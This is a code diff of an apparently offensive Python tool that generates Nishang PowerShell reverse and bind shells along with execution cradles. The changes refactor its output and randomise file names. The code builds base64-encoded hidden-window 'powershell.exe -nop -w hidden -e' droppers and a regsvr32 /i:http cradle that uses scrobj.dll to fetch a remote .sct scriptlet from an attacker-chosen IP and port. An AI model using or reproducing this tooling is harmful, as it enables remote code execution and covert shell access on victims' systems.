@@ -37,18 +37,6 @@ cradle_commands_file = generated_payload_directory+'cradle_commands.txt'
 shell_dictionary = {}
 cradle_dictionary = {}
 
-
-def banner(msg):
-	columns = os.get_terminal_size().columns # the length of the terminal
-	title = (' ' * ((columns - len(msg))//2) + msg) # remove the length of the string from the available columns, then half it to get the middle
-	border_length = (' ' * ((columns - len(msg))) + msg) # do the same, just dont diivide it. this gives the entire length of the terminal
-	corner = '+'
-	dividers = '-' * (columns - len(corner)*2)
-	border = '%s%s%s' % (logger.yellow_fg(corner),logger.red_fg(dividers),logger.yellow_fg(corner))
-	print(border)
-	print(logger.yellow_fg(title))
-	print(border)
-
 def randomString(length=6):
 	return ''.join(random.choice(string.ascii_lowercase) for i in range(length))
 
@@ -59,16 +47,18 @@ def add_cradle_call_command(cradle_name,execution_cradle_command):
 		filecontents.write('\n')
 
 def print_shell_dictionary():
-	print("The following payloads were generated:")
+	print("Generated Payloads:")
 	for shell_name, location in shell_dictionary.items():
-		print("%s: %s%s" % (logger.yellow_fg(shell_name), generated_payload_directory,logger.yellow_fg(location)))
+		logger.bullet("%s: %s%s" % (logger.yellow_fg(shell_name), generated_payload_directory,logger.green_fg(location)))
+	print()
 
 def print_cradle_dictionary():
-	print("The following payloads were generated:")
+	print("Generated Execution Cradles:")
 	for shell_name, cradles in cradle_dictionary.items():
 			randomized_shell_name = cradles[0]
 			execution_cradle_command = cradles[1]
-			print(execution_cradle_command)
+			logger.bullet(logger.green_fg(execution_cradle_command))
+	print()
 
 def get_cradle(filename,payload,random_shell_name=randomString()):
 	with open(filename,'r') as filecontents:
@@ -88,11 +78,10 @@ def set_cradle(filename, filecontents):
 	destination_file.write(filecontents)
 	destination_file.close()
 
-def register_cradle(filename, shellcontent,execution_cradle_command):
-	random_shellname = 'THIS_IS_WHAT_REGSVR32WILLREQUEST.SCT'
-	cradle_dictionary[filename] = (random_shellname,execution_cradle_command)
-	set_cradle(random_shellname, shellcontent)
-	add_cradle_call_command(filename,execution_cradle_command)
+def register_cradle(filename,random_sct_filename, shellcontent,execution_cradle_command):
+	cradle_dictionary[filename,] = [random_sct_filename,execution_cradle_command]
+	set_cradle(random_sct_filename, shellcontent)
+	add_cradle_call_command(random_sct_filename,execution_cradle_command)
 
 # Get a resource
 def get_resource(filename):
@@ -118,7 +107,7 @@ def set_resource(filename, filecontents):
 	destination_file.close()
 
 def register_shell(filename, shellcontent):
-	random_shellname = 'WHAT_THE_EXECUTION_CRADLE_WILL_FETCH_%s.ps1' % randomString()
+	random_shellname = 'shell_%s.ps1' % randomString()
 	shell_dictionary[filename] = random_shellname
 	set_resource(random_shellname, shellcontent)
 
@@ -133,17 +122,17 @@ def raw_dropper_base64(filename):
 	return base64_base_payload
 	
 def show_cradles(shell_name,randomized_shell_name):
-	banner(shell_name)
-	print(logger.green_fg("Raw PowerShell Execution Cradle"))
-	print(raw_dropper(randomized_shell_name))
+	logger.heading(shell_name)
+	print("Raw PowerShell Execution Cradle:")
+	logger.yellow.fg(raw_dropper(randomized_shell_name))
 	print()
 
-	print(logger.green_fg("Base64/UTF-16LE Encoded PowerShell Execution Cradle"))
-	print(raw_dropper_base64(randomized_shell_name))
+	print("Base64/UTF-16LE Encoded PowerShell Execution Cradle:")
+	logger.yellow.fg(raw_dropper_base64(randomized_shell_name))
 	print()
 
-	print(logger.green_fg("Full PowerShell Execution Cradle"))
-	logger.yellow.fg("powershell.exe -nop -w hidden -e %s" % raw_dropper_base64(randomized_shell_name))
+	print("Full PowerShell Execution Cradle:")
+	logger.green.fg("powershell.exe -nop -w hidden -e %s" % raw_dropper_base64(randomized_shell_name))
 	print()
 
 # A base shell to pull
@@ -165,31 +154,30 @@ def regsvr32():
 	shell_name = 'Invoke-PowerShellTcp.ps1' # payload i want to execute
 	shell_file = resource_directory+shell_name # path to said payload
 	regsvr32_template_file = resource_directory+'regsvr32.xml'
-	# nishang_shell = get_resource(shell_file) # obtains the actual src code for the shell
-	# register_shell(shell_name, nishang_shell) # writes out the source code with a randomized name and adds the randomized name to a dict() 
 	b64_payload = raw_dropper_base64(shell_dictionary[shell_name]) # generates the UTF-16LE powershell IEX payload and encodes it into B64 and stores it
 	regsvr_cradle_scriptlet = get_cradle(regsvr32_template_file,b64_payload) # takes in the template cradle and the b64 payload
-	execution_cradle = 'regsvr32 /s /n /u /i:%s:%s:%s scrobj.dll' % (ipaddr,port,shell_dictionary[shell_name])
-	register_cradle('regsvr32', regsvr_cradle_scriptlet,execution_cradle) # filename, shellcontent,execution_cradle. 
+	random_sct_filename = '%s.sct' % randomString(12)
+	execution_cradle_command = 'regsvr32 /s /n /u /i:http://%s:%s/%s scrobj.dll' % (ipaddr,port,random_sct_filename)
+	register_cradle(shell_name,random_sct_filename, regsvr_cradle_scriptlet,execution_cradle_command) # filename, shellcontent,execution_cradle. 
 
 def cradles():
 	regsvr32()
 
 def shells():
 	nishang_powershell_reverse() # create and show 
-
 	nishang_powershell_bind() # create and show 
 
 
-banner('Shelby') # print the banner
+logger.banner()
+
+logger.heading('Shells')
 
 shells()
-cradles()
-
-banner('Shells')
 
 print_shell_dictionary()
 
-banner('Cradles')
+cradles()
+
+logger.heading('Cradles')
 
 print_cradle_dictionary()
